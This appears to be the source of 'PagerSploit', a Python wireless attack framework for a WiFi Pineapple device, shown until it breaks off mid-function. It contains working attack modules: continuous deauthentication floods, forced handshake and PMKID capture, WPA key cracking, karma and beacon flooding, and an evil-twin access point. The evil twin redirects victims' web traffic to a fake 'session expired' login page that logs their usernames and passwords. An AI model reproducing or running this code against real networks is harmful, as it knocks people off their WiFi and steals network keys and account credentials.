#!/usr/bin/env python3
"""
PagerSploit - Wireless Pentest Framework
WiFi Pineapple Pager // wickedNull
Browser UI at http://172.16.52.1:8080
"""

import os, sys, json, re, time, threading, subprocess, argparse
import socket, re, base64, urllib.request, urllib.parse
import signal as _signal
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs, urlparse, unquote_plus

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

_HERE = os.path.dirname(os.path.abspath(__file__))
_LIB  = os.path.join(_HERE, 'lib')
_STARTUP_TIME = time.time()
sys.path.insert(0, _HERE)
sys.path.insert(0, _LIB)  # bundled pagerctl lives here

# Ensure libpagerctl.so can be found by ctypes regardless of how this script
# was launched (payload.sh sets LD_LIBRARY_PATH; direct invocation may not).
_ld = os.environ.get('LD_LIBRARY_PATH', '')
if _LIB not in _ld:
    os.environ['LD_LIBRARY_PATH'] = f'{_LIB}:{_ld}'

# pagerctl drives the Pager hardware screen and buttons.
# It is optional — without it the web UI still works fully (headless mode).
try:
    from pagerctl import Pager
    HAS_PAGER = True
except (ImportError, OSError):
    # OSError covers ctypes failing to load libpagerctl.so (wrong arch, missing deps)
    HAS_PAGER = False
    Pager = None

STATE = {
    'active_module': 'idle', 'module_status': 'Standing by',
    'loot_count': 0, 'server_ip': '172.16.52.1', 'server_port': '8080',
    'payload_dir': '', 'log': [], 'scan_results': [], 'hosts': [],
    'jobs': {}, 'stop_events': {}, 'module_data': {},
    'session_loot': [],  # list of {name,path,category,size,modified} added this run
}
STATE_LOCK = threading.Lock()

NMAP_PATH  = '/mmc/root/payloads/user/reconnaissance/pager_bjorn/lib/nmap'
AIR_PATH   = '/mmc/usr/sbin'
AC_PATH    = '/mmc/usr/bin/aircrack-ng'
MON_IFACE  = 'wlan0mon'
MON2_IFACE = 'wlan1mon'

def log(msg, level='info'):
    entry = {'time': datetime.now().strftime('%H:%M:%S'), 'level': level, 'msg': str(msg)}
    with STATE_LOCK:
        STATE['log'].append(entry)
        if len(STATE['log']) > 1000: STATE['log'] = STATE['log'][-1000:]
    print(f"[{entry['time']}] {msg}", flush=True)

def set_module(name, status='Running'):
    with STATE_LOCK:
        STATE['active_module'] = name
        STATE['module_status'] = status

def set_data(key, val):
    with STATE_LOCK: STATE['module_data'][key] = val

def get_data(key, default=None):
    with STATE_LOCK: return STATE['module_data'].get(key, default)

def get_payload_dir(): return STATE['payload_dir']
def nmap_bin(): return NMAP_PATH if os.path.exists(NMAP_PATH) else 'nmap'

def run_cmd(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired: return 'TIMEOUT'
    except Exception as e: return str(e)

def start_job(name, fn, *args, **kwargs):
    t = threading.Thread(target=fn, args=args, kwargs=kwargs, daemon=True)
    t.start()
    with STATE_LOCK: STATE['jobs'][name] = t
    return t

def make_stop(): return threading.Event()

def reg_stop(name, ev):
    with STATE_LOCK: STATE['stop_events'][name] = ev

def unreg_stop(name):
    with STATE_LOCK: STATE['stop_events'].pop(name, None); STATE['jobs'].pop(name, None)

def stop_module(name):
    with STATE_LOCK:
        ev = STATE['stop_events'].get(name)
        proc = STATE['jobs'].get(name)
    if ev: ev.set()
    if proc and hasattr(proc, 'terminate'):
        try: proc.terminate()
        except: pass
    unreg_stop(name)
    return bool(ev or proc)

def loot_path(*parts): return os.path.join(get_payload_dir(), 'loot', *parts)

def _register_loot(path, subdir):
    try:
        st = os.stat(path)
        entry = {'name': os.path.basename(path), 'path': path, 'category': subdir,
                 'size': st.st_size,
                 'modified': datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')}
        with STATE_LOCK:
            STATE['loot_count'] += 1
            STATE['session_loot'].append(entry)
    except: pass

def save_loot(subdir, filename, content):
    path = loot_path(subdir, filename)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb' if isinstance(content, bytes) else 'w') as f: f.write(content)
    _register_loot(path, subdir)
    log(f'Loot: {filename}', 'success')
    return path

def ts(): return datetime.now().strftime('%Y%m%d_%H%M%S')


# ── WiFi ──────────────────────────────────────────────────────────────────

RECON_DB = '/mmc/root/recon/recon.db'

def _enc_str(v):
    if not v: return 'Open'
    try: v = int(v)
    except: return str(v)
    if v == 2: return 'WEP'
    has3 = bool(v & (1 << 41))
    has2 = bool(v & (1 << 34))
    if has3 and has2: return 'WPA3/2'
    if has3: return 'WPA3'
    if has2: return 'WPA2'
    if v > 0: return 'WPA'
    return 'Open'

def _fmt_mac(mac):
    """Format MAC. recon.db stores mac as bytes of ASCII hex: b'021337AC75C8'"""
    if not mac: return ''
    if isinstance(mac, (bytes, bytearray)):
        try: m = mac.decode('ascii', errors='ignore')
        except: return ''
    else:
        m = str(mac).strip()
    if m.startswith("b'") or m.startswith('b"'):
        m = m[2:]
        if m.endswith("'") or m.endswith('"'): m = m[:-1]
    m = m.replace(':','').replace('-','').replace(' ','').upper()
    if len(m) == 12 and all(c in '0123456789ABCDEF' for c in m):
        return ':'.join(m[i:i+2] for i in range(0,12,2))
    return ''

def _freq_to_ch(freq):
    if not freq: return 0
    freq = int(freq)
    if 2412 <= freq <= 2484: return 14 if freq==2484 else (freq-2407)//5
    if 5160 <= freq <= 5885: return (freq-5000)//5
    if 5955 <= freq <= 7115: return (freq-5950)//5+1
    return 0

def wifi_scan(band='abg', duration=20):
    """Scan APs using iw scan with -u flag for full IE data.
    Uses wlan0cli for 2.4GHz, then passive freq scan for 5GHz/6GHz.
    Supplements with _pineap regex parsing for any missed APs."""
    import re as _re
    log(f'WiFi scan ({band})...')
    set_module('WiFi Scan', 'Scanning...')

    scan_timeout = max(duration, 15)

    def _run_iw_scan(iface, extra_args=None):
        """Run iw scan on interface, return stdout or empty string."""
        cmd = ['iw', 'dev', iface, 'scan'] + (extra_args or [])
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=scan_timeout)
            return r.stdout if r.stdout.strip() else ''
        except subprocess.TimeoutExpired:
            log(f'iw scan timeout on {iface}', 'warn')
            return ''
        except Exception as e:
            log(f'iw {iface}: {e}', 'warn')
            return ''

    def _parse_iw_output(out):
        """Parse iw scan output into list of AP dicts.
        Based on Passpoint Scanner technique — handles all IE types."""
        aps = []
        current = {}
        for line in out.splitlines():
            stripped = line.strip()
            if stripped.startswith('BSS '):
                if current.get('bssid'):
                    aps.append(current)
                current = {
                    'bssid':      stripped.split()[1].split('(')[0].strip().upper(),
                    'ssid':       '',
                    'channel':    0,
                    'freq':       0,
                    'signal':     -100,
                    'encryption': 'Open',
                }
            elif stripped.startswith('SSID:'):
                current['ssid'] = stripped[5:].strip()
            elif stripped.startswith('freq:'):
                try:
                    freq = int(float(stripped.split(':', 1)[1].split()[0]))
                    current['freq'] = freq
                    if not current.get('channel'):
                        current['channel'] = _freq_to_ch(freq)
                except: pass
            elif stripped.startswith('DS Parameter set: channel'):
                try: current['channel'] = int(stripped.split('channel', 1)[1].strip())
                except: pass
            elif stripped.startswith('signal:'):
                try: current['signal'] = float(stripped.split(':', 1)[1].split()[0])
                except: pass
            elif stripped.startswith('capability:'):
                if 'Privacy' not in stripped:
                    current['encryption'] = 'Open'
            elif stripped.startswith('RSN:'):
                current['encryption'] = 'WPA2'
            elif stripped.startswith('WPA:'):
                current['encryption'] = 'WPA'
            elif 'WPA3' in stripped or 'SAE' in stripped:
                current['encryption'] = 'WPA3'
            elif stripped.startswith('HotSpot 2.0'):
                current['hs20'] = True
        if current.get('bssid'):
            aps.append(current)
        return aps

    all_aps = []
    seen_bssids = set()

    # ── Step 1: wlan0cli active scan (2.4GHz) ────────────────────────────
    log('Scanning via wlan0cli...', 'info')
    out1 = _run_iw_scan('wlan0cli')
    if out1:
        parsed = _parse_iw_output(out1)
        log(f'wlan0cli: {len(parsed)} APs', 'info')
        for ap in parsed:
            if ap['bssid'] not in seen_bssids:
                seen_bssids.add(ap['bssid'])
                all_aps.append(ap)

    # ── Step 2: wlan0cli passive freq scan for 5GHz + 6GHz ───────────────
    # Passpoint Scanner technique: scan specific freq ranges passively
    freqs_5ghz = ['5180','5200','5220','5240','5260','5280','5300','5320',
                  '5500','5520','5540','5560','5580','5600','5620','5640',
                  '5660','5680','5700','5720','5745','5765','5785','5805','5825']
    freqs_6ghz = ['5955','6035','6115','6195','6275','6355','6435','6515',
                  '6595','6675','6755','6835','6915','6995','7075']

    scan_freqs = []
    if band in ('abg', 'a', 'all'):
        scan_freqs.extend(freqs_5ghz)
    if band in ('abg', '6', 'all'):
        scan_freqs.extend(freqs_6ghz)

    if scan_freqs:
        log(f'Passive 5GHz/6GHz scan ({len(scan_freqs)} freqs)...', 'info')
        out2 = _run_iw_scan('wlan0cli', ['freq'] + scan_freqs + ['passive'])
        if out2:
            parsed2 = _parse_iw_output(out2)
            added = 0
            for ap in parsed2:
                if ap['bssid'] not in seen_bssids:
                    seen_bssids.add(ap['bssid'])
                    all_aps.append(ap)
                    added += 1
            if added:
                log(f'5GHz/6GHz passive: +{added} APs', 'info')

    # ── Step 3: _pineap RECON APS regex supplement ───────────────────────
    # Gets any APs pineapd has seen that iw missed (different channel timing etc)
    try:
        pr = subprocess.run(
            ['bash', '--login', '-c', '_pineap RECON APS limit=200 format=json'],
            capture_output=True, text=True, timeout=20
        )
        raw = pr.stdout
        macs  = _re.findall(r'"mac"\s*:\s*"([0-9A-Fa-f:]{17})"', raw)
        ssids = _re.findall(r'"ssid"\s*:\s*"([^"]*)"', raw)
        chans = _re.findall(r'"channel"\s*:\s*(\d+)', raw)
        sigs  = _re.findall(r'"signal"\s*:\s*(-?\d+)', raw)
        added = 0
        for i, mac in enumerate(macs):
            bssid = mac.upper()
            if bssid in seen_bssids:
                # Update SSID if we have it from _pineap but iw gave empty
                for ap in all_aps:
                    if ap['bssid'] == bssid and not ap['ssid'] and i < len(ssids) and ssids[i]:
                        ap['ssid'] = ssids[i]
                continue
            ssid = ssids[i] if i < len(ssids) else ''
            ch   = int(chans[i]) if i < len(chans) else 0
            sig  = int(sigs[i])  if i < len(sigs)  else -100
            all_aps.append({'bssid': bssid, 'ssid': ssid, 'channel': ch,
                           'freq': 0, 'signal': sig, 'encryption': 'WPA2'})
            seen_bssids.add(bssid)
            added += 1
        if added:
            log(f'_pineap added {added} more APs', 'info')
    except Exception as e:
        log(f'_pineap supplement skipped: {e}', 'info')

    if not all_aps:
        log('No APs found from any source', 'error')
        set_module('idle', '0 APs found')
        return []

    log(f'Total before filter: {len(all_aps)}', 'info')

    # ── Band filter ───────────────────────────────────────────────────────
    def _in_band(ap):
        ch = ap.get('channel', 0)
        freq = ap.get('freq', 0)
        if band == 'bg':  return 1 <= ch <= 14 or 2400 <= freq <= 2500
        if band == 'a':   return (15 <= ch <= 180) or (5000 <= freq <= 5925)
        if band == '6':   return ch > 180 or freq >= 5925
        return True  # abg = all

    filtered = [a for a in all_aps if _in_band(a)]
    filtered.sort(key=lambda x: x['signal'], reverse=True)

    result = []
    for a in filtered:
        result.append({
            'ssid':       a['ssid'] if a['ssid'] else '<hidden>',
            'bssid':      a['bssid'],
            'channel':    a['channel'],
            'signal':     int(a['signal']),
            'encryption': a['encryption'],
            'clients':    0,
            'power':      int(a['signal']),
        })

    with STATE_LOCK:
        STATE['scan_results'] = result[:80]
    log(f'Scan done: {len(result)} APs', 'success')
    set_module('idle', f'{len(result)} APs found')
    return result


# Cache which source prefix works for pineapple commands (discovered on first call)
_PINEAPPLE_SOURCE = None

def _pineapple(*args):
    """
    Run a pineapd DuckyScript command. Caches the working shell source prefix
    after the first successful call so subsequent calls are fast.
    """
    global _PINEAPPLE_SOURCE
    cmd_str = ' '.join(f'"{a}"' for a in args)

    sources = [
        '',                                           # binary in PATH (most likely)
        'source /etc/profile 2>/dev/null; ',
        'source /etc/pineapple/functions 2>/dev/null; ',
        'source /usr/share/pineapple/functions 2>/dev/null; ',
        'source /mmc/etc/pineapple/functions 2>/dev/null; ',
    ]

    # If we already know which source works, use only that
    with STATE_LOCK:
        cached = _PINEAPPLE_SOURCE
    if cached is not None:
        to_try = [cached]
    else:
        to_try = sources

    for prefix in to_try:
        full = f'{prefix}{cmd_str}'
        try:
            r = subprocess.run(
                ['bash', '--login', '-c', full],
                capture_output=True, text=True, timeout=10
            )
            if r.returncode == 0:
                with STATE_LOCK:
                    if _PINEAPPLE_SOURCE is None:
                        _PINEAPPLE_SOURCE = prefix
                        log(f'pineapple source: {repr(prefix) if prefix else "PATH"}', 'info')
                return r.stdout.strip()
            if 'command not found' in r.stderr or 'not found' in r.stderr:
                continue
            if r.stderr:
                log(f'pineapple {args[0]}: {r.stderr.strip()[:80]}', 'warn')
            return r.stdout.strip()
        except Exception as e:
            log(f'pineapple cmd error: {e}', 'error')
            continue

    log(f'pineapple {args[0]}: not found in any environment', 'error')
    return ''

def wifi_deauth(bssid, channel='6', count='0', client='FF:FF:FF:FF:FF:FF'):
    """Deauth via pineapd — PINEAPPLE_DEAUTH_CLIENT handles injection."""
    stop = make_stop(); reg_stop('deauth', stop)
    def _run():
        log(f'Deauth: {bssid} ch{channel} -> {client}', 'warn')
        set_module('Deauth', bssid)
        if str(count) == '0':
            while not stop.is_set():
                _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, client, channel)
                stop.wait(2)
        else:
            _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, client, channel)
        log('Deauth stopped', 'info')
        set_module('idle', 'Deauth done')
        unreg_stop('deauth')
    start_job('deauth', _run)
    return stop

def wifi_capture(bssid, channel, ssid='capture'):
    """Lock pineapd to AP channel + deauth to force handshake.
    pineapd auto-saves handshakes to /root/loot/handshakes/."""
    stop = make_stop(); reg_stop('capture', stop)
    hs_dir = '/root/loot/handshakes'   # where pineapd saves handshakes
    loot_hs = loot_path('handshakes')   # where our loot browser looks
    os.makedirs(hs_dir, exist_ok=True)
    os.makedirs(loot_hs, exist_ok=True)
    def _run():
        log(f'Capture: {ssid} ({bssid}) ch{channel}', 'info')
        set_module('Capture', ssid)
        with STATE_LOCK:
            STATE['module_data']['capture_bssid'] = bssid
            STATE['module_data']['capture_ssid'] = ssid
            STATE['module_data']['capture_dir'] = hs_dir
        # Stop hopping, lock pineapd to this AP's channel for better capture
        _pineapple('PINEAPPLE_HOPPING_STOP')
        _pineapple('PINEAPPLE_EXAMINE_BSSID', bssid)
        # Deauth to force 4-way handshake
        _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, 'FF:FF:FF:FF:FF:FF', channel)
        capture_start = time.time()
        seen = set(os.listdir(hs_dir))
        deadline = capture_start + 300
        hs_extensions = ('.cap', '.pcap', '.22000', '.hc22000', '.hccapx')
        bssid_bare = bssid.replace(':', '').lower()
        while not stop.is_set() and time.time() < deadline:
            try:
                current = set(os.listdir(hs_dir))
                for f in (current - seen):
                    fpath = os.path.join(hs_dir, f)
                    # Accept any handshake-format file created after capture started
                    # Primary: filename contains BSSID or SSID; fallback: any new hs file
                    is_hs_ext = any(f.lower().endswith(e) for e in hs_extensions)
                    name_match = (bssid_bare in f.lower() or
                                  (ssid and ssid != '<hidden>' and ssid.lower() in f.lower()))
                    mtime_new = False
                    try: mtime_new = os.path.getmtime(fpath) >= capture_start - 5
                    except: pass
                    if is_hs_ext and (name_match or mtime_new):
                        log(f'HANDSHAKE: {f}', 'success')
                        try:
                            import shutil as _sh
                            dst = os.path.join(loot_hs, f)
                            _sh.copy2(fpath, dst)
                            _register_loot(dst, 'handshakes')
                        except Exception: pass
                seen = current
            except: pass
            # Re-deauth every 30s to keep forcing reconnects
            if not stop.is_set():
                _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, 'FF:FF:FF:FF:FF:FF', channel)
            stop.wait(30)
        _pineapple('PINEAPPLE_EXAMINE_RESET')
        _pineapple('PINEAPPLE_HOPPING_START')
        log('Capture stopped', 'info')
        set_module('idle', 'Capture done')
        unreg_stop('capture')
    start_job('capture', _run)
    return stop, hs_dir

def wifi_crack(cap_file, wordlist):
    """Crack WPA handshake. Supports .pcap (aircrack-ng) and .22000 (hashcat hcwpax format).
    pineapd saves both formats to /root/loot/handshakes/."""
    stop = make_stop(); reg_stop('crack', stop)
    output = []; set_data('crack_output', [])
    def _run():
        log(f'Cracking: {os.path.basename(cap_file)}', 'info')
        set_module('Cracking', os.path.basename(cap_file))
        key_found = False
        try:
            is_22000 = cap_file.endswith('.22000') or cap_file.endswith('.hc22000') or cap_file.endswith('.hccapx')
            hashcat = subprocess.run(['which','hashcat'], capture_output=True, text=True).stdout.strip()
            if is_22000 and hashcat:
                log('Using hashcat for .22000 format', 'info')
                proc = subprocess.Popen(
                    [hashcat, '-m', '22000', cap_file, wordlist, '--force', '--quiet'],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            else:
                if is_22000:
                    log('hashcat not found — aircrack-ng cannot crack .22000; install hashcat', 'warn')
                ac = AC_PATH if os.path.exists(AC_PATH) else 'aircrack-ng'
                proc = subprocess.Popen(
                    [ac, '-w', wordlist, cap_file],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            with STATE_LOCK: STATE['jobs']['crack_proc'] = proc
            for line in proc.stdout:
                if stop.is_set(): proc.terminate(); break
                output.append(line.rstrip())
                # Push live output every 5 lines to avoid excessive lock contention
                if len(output) % 5 == 0:
                    set_data('crack_output', list(output))
                if 'KEY FOUND' in line or 'Recovered' in line or 'password:' in line.lower():
                    key_found = True
                    log(f'KEY FOUND: {line.strip()}', 'success')
            proc.wait()
        except Exception as e:
            log(f'Crack error: {e}', 'error')
            output.append(f'ERROR: {e}')
        # Always save final output to loot so JS can display results regardless of outcome
        if output:
            tag = 'crack_hit' if key_found else 'crack_done'
            save_loot('credentials', f'{tag}_{ts()}.txt', '\n'.join(output))
        set_data('crack_output', list(output))
        status = 'KEY FOUND — check Loot' if key_found else f'Done — no key in {os.path.basename(wordlist)}'
        log(status, 'success' if key_found else 'info')
        set_module('idle', status); unreg_stop('crack')
    start_job('crack', _run)
    return stop, output

def wifi_probe_harvest(duration=60):
    """Harvest probe requests via _pineap RECON CLIENTS."""
    import json as _json
    stop = make_stop(); reg_stop('probe_harvest', stop)
    def _run():
        log('Probe harvest via _pineap RECON CLIENTS', 'info')
        set_module('Probe Harvest', 'Listening...')
        deadline = time.time() + duration
        probes = {}  # mac -> set of ssids
        while not stop.is_set() and time.time() < deadline:
            try:
                r = subprocess.run(
                    ['bash', '--login', '-c', '_pineap RECON CLIENTS format=json limit=500'],
                    capture_output=True, text=True, timeout=15
                )
                raw = r.stdout
                # Use regex like FENRIS — no JSON parser, no banner issue
                client_macs = re.findall(r'"mac"\s*:\s*"([0-9A-Fa-f:]{17})"', raw)
                probe_ssids_raw = re.findall(r'"ssid"\s*:\s*"([^"]*)"', raw)
                # Build fake client list from regex results
                clients = [{'mac': m} for m in client_macs]
                # probes are separate — attach them
                for j, client in enumerate(clients):
                    client['probes'] = [probe_ssids_raw[j]] if j < len(probe_ssids_raw) and probe_ssids_raw[j] else []
                for client in clients:
                    mac = client.get('mac','').upper().strip()
                    if not mac: continue
                    # probes field is list of ssids the client is searching for
                    for ssid in client.get('probes', []):
                        if not ssid: continue
                        if mac not in probes: probes[mac] = set()
                        probes[mac].add(ssid)
            except Exception as e: log(f'Probe harvest: {e}', 'error')
            stop.wait(10)
        result = [{'mac': m, 'probes': list(s)} for m, s in probes.items()]
        set_data('probe_results', result)
        if result: save_loot('scans', f'probes_{ts()}.json', json.dumps(result, indent=2))
        log(f'Probe harvest: {len(probes)} devices', 'success')
        set_module('idle', f'{len(probes)} devices'); unreg_stop('probe_harvest')
    start_job('probe_harvest', _run)
    return stop

def wifi_beacon_flood(ssids):
    """Add SSIDs to pineapd SSID pool and start advertising."""
    stop = make_stop(); reg_stop('beacon_flood', stop)
    def _run():
        log(f'Beacon flood: {len(ssids)} SSIDs', 'warn')
        set_module('Beacon Flood', f'{len(ssids)} SSIDs')
        for ssid in ssids:
            _pineapple('PINEAPPLE_SSID_POOL_ADD', ssid)
        _pineapple('PINEAPPLE_SSID_POOL_START')
        stop.wait()
        _pineapple('PINEAPPLE_SSID_POOL_STOP')
        log('Beacon flood stopped', 'info')
        set_module('idle', 'Flood stopped'); unreg_stop('beacon_flood')
    start_job('beacon_flood', _run)
    return stop

def wifi_wps_scan():
    """WPS scan via recon.db."""
    import sqlite3 as _sq
    log('WPS scan from recon DB', 'info')
    set_module('WPS Scan', 'Scanning...')
    output = []
    try:
        con = _sq.connect(f'file:{RECON_DB}?mode=ro', uri=True, timeout=5)
        con.row_factory = _sq.Row
        cur = con.cursor()
        cur.execute('PRAGMA table_info(wifi_device)')
        cols = [r['name'] for r in cur.fetchall()]
        if 'wps' in cols:
            cur.execute('''SELECT w.mac, s.channel, s.freq, s.signal, s.ssid, w.wps
                FROM wifi_device w LEFT JOIN ssid s ON s.wifi_device=w.hash
                WHERE w.wps IS NOT NULL AND s.type=4 GROUP BY w.mac''')
            for row in cur.fetchall():
                output.append({'bssid': _fmt_mac(row['mac']),
                    'channel': row['channel'] or _freq_to_ch(row['freq']),
                    'rssi': row['signal'] or -100, 'ssid': str(row['ssid'] or ''),
                    'wps_info': str(row['wps'] or '')})
        else:
            cur.execute(
                "SELECT w.mac, s.channel, s.freq, s.signal, s.ssid "
                "FROM ssid s JOIN wifi_device w ON s.wifi_device=w.hash "
                "WHERE s.type=4 GROUP BY w.mac ORDER BY s.signal DESC LIMIT 50"
            )
            for row in cur.fetchall():
                raw = row['ssid']
                try: ssid_s = bytes(raw).decode('utf-8',errors='replace').strip('\x00') if raw else ''
                except: ssid_s = str(raw or '')
                output.append({'bssid': _fmt_mac(row['mac']),
                    'channel': row['channel'] or _freq_to_ch(row['freq']),
                    'rssi': row['signal'] or -100, 'ssid': ssid_s or '<hidden>',
                    'wps_info': 'unknown'})
        con.close()
    except Exception as e: log(f'WPS scan: {e}', 'error')
    if output: save_loot('scans', f'wps_{ts()}.json', json.dumps(output, indent=2))
    set_data('wps_results', output)
    log(f'WPS: {len(output)} APs', 'success')
    set_module('idle', f'{len(output)} APs')
    return output

def wifi_karma(channel='6', ssids=None):
    """Karma via pineapd MIMIC — responds to all probe requests."""
    stop = make_stop(); reg_stop('karma', stop)
    def _run():
        log('Karma/MIMIC started', 'warn')
        set_module('Karma', 'Responding...')
        _pineapple('PINEAPPLE_MIMIC_ENABLE')
        if ssids:
            for ssid in ssids:
                _pineapple('PINEAPPLE_SSID_POOL_ADD', ssid)
            _pineapple('PINEAPPLE_SSID_POOL_START')
        stop.wait()
        _pineapple('PINEAPPLE_MIMIC_DISABLE')
        if ssids: _pineapple('PINEAPPLE_SSID_POOL_STOP')
        log('Karma stopped', 'info')
        set_module('idle', 'Karma stopped'); unreg_stop('karma')
    start_job('karma', _run)
    return stop

def wifi_auth_flood(bssid, channel='6'):
    """Rapid deauth loop — practical equivalent of auth flood on this hardware."""
    stop = make_stop(); reg_stop('auth_flood', stop)
    def _run():
        log(f'Auth flood (deauth loop): {bssid}', 'warn')
        set_module('Auth Flood', bssid)
        while not stop.is_set():
            _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, 'FF:FF:FF:FF:FF:FF', channel)
            stop.wait(1)
        log('Auth flood stopped', 'info')
        set_module('idle', 'Flood stopped'); unreg_stop('auth_flood')
    start_job('auth_flood', _run)
    return stop

def wifi_evil_twin(ssid, channel='6', portal_file=None):
    """Evil twin via pineapd Open AP on br-evil (10.0.0.1/24). Optional captive portal."""
    import shutil
    stop = make_stop(); reg_stop('evil_twin', stop)
    def _run():
        log(f'Evil twin: {ssid} ch{channel}', 'warn')
        set_module('Evil Twin', ssid)
        _pineapple('PINEAPPLE_NETWORK_FILTER_ADD', ssid)
        _pineapple('PINEAPPLE_SSID_POOL_ADD', ssid)
        _pineapple('PINEAPPLE_SSID_POOL_START')
        _pineapple('PINEAPPLE_MIMIC_ENABLE')
        time.sleep(2)
        portal_proc = None
        portal_dir = '/tmp/ps_portal'
        os.makedirs(portal_dir, exist_ok=True)
        # Prepare portal content
        if portal_file and os.path.exists(portal_file):
            shutil.copy(portal_file, os.path.join(portal_dir, 'index.html'))
            log(f'Portal: {os.path.basename(portal_file)}', 'info')
        else:
            # Write a default credential-capture page so port 8888 is always served
            with open(os.path.join(portal_dir, 'index.html'), 'w') as _f:
                _f.write(
                    '<!DOCTYPE html><html><head><meta charset="UTF-8">'
                    '<title>WiFi Login</title>'
                    '<style>body{font-family:sans-serif;background:#f0f0f0;display:flex;'
                    'justify-content:center;align-items:center;height:100vh;margin:0}'
                    '.box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 8px #aaa;min-width:300px}'
                    'h2{margin-top:0}input{width:100%;padding:8px;margin:6px 0 14px;box-sizing:border-box}'
                    'button{width:100%;padding:10px;background:#0078d7;color:#fff;border:none;'
                    'border-radius:4px;cursor:pointer;font-size:15px}</style></head>'
                    '<body><div class="box"><h2>WiFi Authentication</h2>'
                    '<p style="color:#555">Your session has expired. Please sign in to continue.</p>'
                    '<form method="POST" action="/login">'
                    '<label>Email / Username</label><input name="username" type="text" autocomplete="off">'
                    '<label>Password</label><input name="password" type="password">'
                    '<button type="submit">Sign In</button></form></div></body></html>'
                )
        # Always redirect port 80 on br-evil to our portal server
        subprocess.run(['nft', 'add', 'table', 'ip', 'ps_eviltwin'], stderr=subprocess.DEVNULL)
        subprocess.run(['nft', 'add', 'chain', 'ip', 'ps_eviltwin', 'prerouting',
            '{', 'type', 'nat', 'hook', 'prerouting', 'priority', '-100', ';', '}'],
            stderr=subprocess.DEVNULL)
        subprocess.run(['nft', 'add', 'rule', 'ip', 'ps_eviltwin', 'prerouting',
            'iif', 'br-evil', 'tcp', 'dport', '80', 'dnat', 'to', '10.0.0.1:8888'],
            stderr=subprocess.DEVNULL)
        # Portal HTTP server — captures GET+POST, logs credentials
        ilog = loot_path('credentials', f'portal_{ts()}.log')
        os.makedirs(loot_path('credentials'), exist_ok=True)

        class _PortalHandler(BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def _serve_portal(self):
                idx = os.path.join(portal_dir, 'index.html')
                try:
                    with open(idx, 'rb') as _f: body = _f.read()
                except Exception:
                    body = b'<html><body>Loading...</body></html>'
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', len(body))
                self.end_headers(); self.wfile.write(body)
            def do_GET(self): self._serve_portal()
            def do_POST(self):
                length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(length).decode('utf-8', errors='replace') if length else ''
                entry = f'[{datetime.now().strftime("%H:%M:%S")}] POST {self.headers.get("Host","")}{self.path} from {self.client_address[0]} | {body[:400]}\n'
                try:
                    with open(ilog, 'a') as _f: _f.write(entry)
                    _register_loot(ilog, 'credentials')
                except Exception: pass
                log(f'PORTAL CREDS: {body[:100]}', 'success')
                # Redirect back to portal after submission
                self.send_response(302)
                self.send_header('Location', '/')
                self.end_headers()

        portal_server = HTTPServer(('0.0.0.0', 8888), _PortalHandler)
        portal_server.timeout = 1.0

        def _portal_loop():
            while not stop.is_set():
                portal_server.handle_request()

        portal_proc = threading.Thread(target=_portal_loop, daemon=True)
        portal_proc.start()
        log('Evil twin active — portal on :8888', 'success')
        stop.wait()
        subprocess.run(['nft', 'delete', 'table', 'ip', 'ps_eviltwin'], stderr=subprocess.DEVNULL)
        _pineapple('PINEAPPLE_MIMIC_DISABLE')
        _pineapple('PINEAPPLE_SSID_POOL_STOP')
        shutil.rmtree(portal_dir, ignore_errors=True)
        log('Evil twin stopped', 'info')
        set_module('idle', 'Twin stopped'); unreg_stop('evil_twin')
    start_job('evil_twin', _run)
    return stop

def wifi_channel_hop(band='2'):
    """Channel hopping is native to pineapd. Configure bands via SET_BANDS."""
    band_map = {'2': '2', '5': '5', '6': '6', 'abg': '2 5', '26': '2 6', 'all': '2 5 6'}
    bands = band_map.get(str(band), '2 5')
    _pineapple('PINEAPPLE_SET_BANDS', 'wlan1mon', *bands.split())
    log(f'Channel hop: pineapd bands set to {bands}', 'info')
    set_module('idle', f'pineapd hopping {bands}GHz')
    stop = make_stop(); reg_stop('channel_hop', stop); stop.set(); unreg_stop('channel_hop')
    return stop

def wifi_pmkid(bssid, channel):
    """PMKID capture: lock pineapd to AP, deauth to trigger PMKID/4-way exchange."""
    stop = make_stop(); reg_stop('pmkid', stop)
    hs_dir = '/root/loot/handshakes'
    loot_hs = loot_path('handshakes')
    os.makedirs(hs_dir, exist_ok=True)
    os.makedirs(loot_hs, exist_ok=True)
    def _run():
        log(f'PMKID: {bssid} ch{channel}', 'info')
        set_module('PMKID', bssid)
        _pineapple('PINEAPPLE_HOPPING_STOP')
        _pineapple('PINEAPPLE_EXAMINE_BSSID', bssid)
        _pineapple('PINEAPPLE_DEAUTH_CLIENT', bssid, 'FF:FF:FF:FF:FF:FF', channel)
        pmkid_start = time.time()
        seen = set(os.listdir(hs_dir))
        bssid_bare = bssid.replace(':', '').lower()
        hs_extensions = ('.cap', '.pcap', '.22000', '.hc22000', '.hccapx')
        deadline = pmkid_start + 120
        while not stop.is_set() and time.time() < deadline:
            try:
                current = set(os.listdir(hs_dir))
                for f in (current - seen):
                    fpath = os.path.join(hs_dir, f)
                    is_hs_ext = any(f.lower().endswith(e) for e in hs_extensions)
                    mtime_new = False
                    try: mtime_new = os.path.getmtime(fpath) >= pmkid_start - 5
                    except: pass
                    if is_hs_ext and (bssid_bare in f.lower() or mtime_new):
                        log(f'PMKID/HS: {f}', 'success')
                        try:
                            import shutil as _sh
                            dst = os.path.join(loot_hs, f)
                            _sh.copy2(fpath, dst)
